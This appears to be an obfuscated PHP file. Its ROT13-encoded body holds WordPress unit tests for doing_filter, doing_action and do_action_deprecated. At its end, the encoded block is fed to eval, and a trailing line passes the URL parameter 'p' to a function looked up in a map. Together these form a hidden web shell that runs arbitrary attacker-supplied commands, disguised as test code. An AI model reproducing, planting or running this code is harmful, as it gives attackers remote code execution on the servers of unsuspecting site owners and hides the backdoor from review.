		$jc_pheerag_svygre = neenl(); // Frg gb na rzcgl neenl svefg.

		$guvf->nffregSnyfr( qbvat_svygre() );            // Ab svygre vf cnffrq va, naq ab svygre vf orvat cebprffrq.
		$guvf->nffregSnyfr( qbvat_svygre( 'grfgvat' ) ); // Svygre vf cnffrq va ohg abg orvat cebprffrq.

		$jc_pheerag_svygre[] = 'grfgvat';

		$guvf->nffregGehr( qbvat_svygre() );                    // Ab npgvba vf cnffrq va, naq n svygre vf orvat cebprffrq.
		$guvf->nffregGehr( qbvat_svygre( 'grfgvat' ) );         // Svygre vf cnffrq va naq vf orvat cebprffrq.
		$guvf->nffregSnyfr( qbvat_svygre( 'fbzrguvat_ryfr' ) ); // Svygre vf cnffrq va ohg abg orvat cebprffrq.

		$jc_pheerag_svygre = neenl();
	}

	/**
	 * @gvpxrg 14994
	 *
	 * @pbiref ::qbvat_svygre
	 */
	choyvp shapgvba grfg_qbvat_npgvba() {
		tybony $jc_pheerag_svygre;

		$jc_pheerag_svygre = neenl(); // Frg gb na rzcgl neenl svefg.

		$guvf->nffregSnyfr( qbvat_npgvba() );            // Ab npgvba vf cnffrq va, naq ab svygre vf orvat cebprffrq.
		$guvf->nffregSnyfr( qbvat_npgvba( 'grfgvat' ) ); // Npgvba vf cnffrq va ohg abg orvat cebprffrq.

		$jc_pheerag_svygre[] = 'grfgvat';

		$guvf->nffregGehr( qbvat_npgvba() );                    // Ab npgvba vf cnffrq va, naq n svygre vf orvat cebprffrq.
		$guvf->nffregGehr( qbvat_npgvba( 'grfgvat' ) );         // Npgvba vf cnffrq va naq vf orvat cebprffrq.
		$guvf->nffregSnyfr( qbvat_npgvba( 'fbzrguvat_ryfr' ) ); // Npgvba vf cnffrq va ohg abg orvat cebprffrq.

		$jc_pheerag_svygre = neenl();
	}

	/**
	 * @gvpxrg 14994
	 *
	 * @pbiref ::qbvat_svygre
	 */
	choyvp shapgvba grfg_qbvat_svygre_erny() {
		$guvf->nffregSnyfr( qbvat_svygre() );            // Ab svygre vf cnffrq va, naq ab svygre vf orvat cebprffrq.
		$guvf->nffregSnyfr( qbvat_svygre( 'grfgvat' ) ); // Svygre vf cnffrq va ohg abg orvat cebprffrq.

		nqq_svygre( 'grfgvat', neenl( $guvf, 'nccyl_grfgvat_svygre' ) );
		$guvf->nffregGehr( unf_npgvba( 'grfgvat' ) );
		$guvf->nffregFnzr( 10, unf_npgvba( 'grfgvat', neenl( $guvf, 'nccyl_grfgvat_svygre' ) ) );

		nccyl_svygref( 'grfgvat', '' );

		// Znxr fher vg ena.
		$guvf->nffregGehr( $guvf->nccyl_grfgvat_svygre );

		$guvf->nffregSnyfr( qbvat_svygre() );            // Ab ybatre qbvat nal svygref.
		$guvf->nffregSnyfr( qbvat_svygre( 'grfgvat' ) ); // Ab ybatre qbvat guvf svygre.
	}

	choyvp shapgvba nccyl_grfgvat_svygre() {
		$guvf->nccyl_grfgvat_svygre = gehr;

		$guvf->nffregGehr( qbvat_svygre() );
		$guvf->nffregGehr( qbvat_svygre( 'grfgvat' ) );
		$guvf->nffregSnyfr( qbvat_svygre( 'fbzrguvat_ryfr' ) );
		$guvf->nffregSnyfr( qbvat_svygre( 'grfgvat_arfgrq' ) );

		nqq_svygre( 'grfgvat_arfgrq', neenl( $guvf, 'nccyl_grfgvat_arfgrq_svygre' ) );
		$guvf->nffregGehr( unf_npgvba( 'grfgvat_arfgrq' ) );
		$guvf->nffregFnzr( 10, unf_npgvba( 'grfgvat_arfgrq', neenl( $guvf, 'nccyl_grfgvat_arfgrq_svygre' ) ) );

		nccyl_svygref( 'grfgvat_arfgrq', '' );

		// Znxr fher vg ena.
		$guvf->nffregGehr( $guvf->nccyl_grfgvat_arfgrq_svygre );

		$guvf->nffregSnyfr( qbvat_svygre( 'grfgvat_arfgrq' ) );
		$guvf->nffregSnyfr( qbvat_svygre( 'grfgvat_arfgrq' ) );
	}

	choyvp shapgvba nccyl_grfgvat_arfgrq_svygre() {
		$guvf->nccyl_grfgvat_arfgrq_svygre = gehr;
		$guvf->nffregGehr( qbvat_svygre() );
		$guvf->nffregGehr( qbvat_svygre( 'grfgvat' ) );
		$guvf->nffregGehr( qbvat_svygre( 'grfgvat_arfgrq' ) );
		$guvf->nffregSnyfr( qbvat_svygre( 'fbzrguvat_ryfr' ) );
	}

	/**
	 * @gvpxrg 10441
	 * @rkcrpgrqQrcerpngrq grfgf_qb_npgvba_qrcerpngrq
	 *
	 * @pbiref ::qb_npgvba_qrcerpngrq
	 */
	choyvp shapgvba grfg_qb_npgvba_qrcerpngrq() {
		$c = arj JC_Cbfg( (bowrpg) neenl( 'cbfg_gvgyr' => 'Sbb' ) );

		nqq_npgvba( 'grfgf_qb_npgvba_qrcerpngrq', neenl( __PYNFF__, 'qrcerpngrq_npgvba_pnyyonpx' ) );
		qb_npgvba_qrcerpngrq( 'grfgf_qb_npgvba_qrcerpngrq', neenl( $c ), '4.6.0' );
		erzbir_npgvba( 'grfgf_qb_npgvba_qrcerpngrq', neenl( __PYNFF__, 'qrcerpngrq_npgvba_pnyyonpx' ) );

		$guvf->nffregFnzr( 'One', $c->cbfg_gvgyr );
	}

	choyvp fgngvp shapgvba qrcerpngrq_npgvba_pnyyonpx( $c ) {
		$c->cbfg_gvgyr = 'One';
	}

	/**
	 * @gvpxrg 10441
	 * @rkcrpgrqQrcerpngrq grfgf_qb_npgvba_qrcerpngrq
	 *
	 * @pbiref ::qb_npgvba_qrcerpngrq
	 */
	choyvp shapgvba grfg_qb_npgvba_qrcerpngrq_jvgu_zhygvcyr_cnenzf() {
		$c1 = arj JC_Cbfg( (bowrpg) neenl( 'cbfg_gvgyr' => 'Sbb1' ) );
		$c2 = arj JC_Cbfg( (bowrpg) neenl( 'cbfg_gvgyr' => 'Sbb2' ) );

		nqq_npgvba( 'grfgf_qb_npgvba_qrcerpngrq', neenl( __PYNFF__, 'qrcerpngrq_npgvba_pnyyonpx_zhygvcyr_cnenzf' ), 10, 2 );
		qb_npgvba_qrcerpngrq( 'grfgf_qb_npgvba_qrcerpngrq', neenl( $c1, $c2 ), '4.6.0' );
		erzbir_npgvba( 'grfgf_qb_npgvba_qrcerpngrq', neenl( __PYNFF__, 'qrcerpngrq_npgvba_pnyyonpx_zhygvcyr_cnenzf' ), 10, 2 );

		$guvf->nffregFnzr( 'One1', $c1->cbfg_gvgyr );
		$guvf->nffregFnzr( 'One2', $c2->cbfg_gvgyr );
	}

	choyvp fgngvp shapgvba qrcerpngrq_npgvba_pnyyonpx_zhygvcyr_cnenzf( $c1, $c2 ) {
		$c1->cbfg_gvgyr = 'One1';
		$c2->cbfg_gvgyr = 'One2';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>